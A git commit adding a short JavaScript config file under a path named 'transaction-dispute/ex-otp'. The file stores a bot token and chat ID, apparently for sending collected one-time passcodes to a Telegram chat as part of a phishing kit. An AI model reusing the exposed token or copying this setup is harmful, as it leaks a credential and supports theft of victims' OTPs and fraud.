b6e3c68a1210be819c87b084b233fce120a10961
njosplin <njosplin@gmail.com>
2026-06-30 09:39:55 +1000

    Add files via upload

---
+++ transaction-dispute/ex-otp/config/email.js
@@ -0,0 +1,5 @@
+// config/email.js
+const CONFIG = {
+    apikey: "8563470132:AAH5qMSbltcc81sAbjGVAXOw8CoTUsqzaPY",  // your bot token
+    chatid: "722615124"                                          // your chat ID
+};
